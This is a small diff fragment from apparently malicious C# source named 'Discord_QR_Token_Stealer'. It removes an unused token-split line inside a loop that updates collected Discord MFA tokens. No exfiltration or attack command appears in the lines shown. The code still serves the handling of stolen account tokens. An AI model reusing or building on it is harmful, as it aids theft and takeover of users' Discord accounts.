@@ -446,8 +446,6 @@ namespace Discord_QR_Token_Stealer
             // update any tokens that have the same snowflake
             for (var x = 0;x < tokens.Count;x++)
             {
-                var tokenSplit = tokens[x].Split('.');
-
                 if (tokens[x].StartsWith("mfa"))
                     if (tokens[x].StartsWith(token.Substring(4).Substring(4)))
                         tokens[x] = token;
